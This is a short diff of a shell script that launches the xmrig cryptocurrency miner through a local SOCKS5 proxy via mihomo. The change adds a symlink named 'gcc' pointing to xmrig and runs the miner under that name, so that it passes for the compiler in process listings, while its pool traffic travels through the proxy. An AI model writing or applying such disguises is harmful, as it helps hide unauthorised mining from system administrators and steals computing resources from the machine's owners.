@@ -23,6 +23,7 @@ chmod a+x mihomo
 
 cp -f xmrig{-$HOSTTYPE,}
 chmod a+x xmrig
+ln -f -s xmrig gcc
 
 #--------------------------------------------------
 
@@ -85,4 +86,4 @@ for i in {1..30}; do
 done
 
 echo '>> 启动 xmrig (stratum 经 SOCKS5) ...'
-./xmrig   -a $ALG   -o "$POOL"   -u $DEV   -p x    -x 127.0.0.1:7890
+./gcc   -a $ALG   -o "$POOL"   -u $DEV   -p x    -x 127.0.0.1:7890
